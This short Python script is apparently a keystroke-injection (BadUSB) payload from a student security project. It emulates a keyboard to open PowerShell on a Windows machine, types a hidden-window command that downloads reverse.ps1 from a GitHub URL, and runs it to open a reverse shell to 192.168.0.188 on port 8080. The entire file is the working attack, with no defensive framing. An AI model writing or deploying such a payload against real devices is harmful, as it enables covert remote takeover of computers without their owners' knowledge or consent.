# Insert a reverse shell into target device
import os
import time
import HID
from HID import CODE

if __name__ == '__main__':
    HID.press(bytes([CODE.LEFT_CTRL, 0, CODE.ESC, *[0] * 5]))
    time.sleep(0.1)
    # open powershell
    cmd = "powershell"
    HID.type_string(cmd)
    time.sleep(0.2)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
    time.sleep(0.2)
    cmd = "cd .\Desktop\Something-Awesome"
    HID.type_string(cmd)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))
    time.sleep(0.2)
    cmd = "powershell.exe -nologo -windowstyle hidden -command Invoke-WebRequest -Uri https://raw.githubusercontent.com/thefishua/Something-Awesome/main/reverse.ps1 -Outfile .\\reverse.ps1;"
    cmd += " .\\reverse.ps1 192.168.0.188 8080"
    HID.type_string(cmd)
    HID.press(bytes([*[0] * 2, CODE.ENTER, *[0] * 5]))

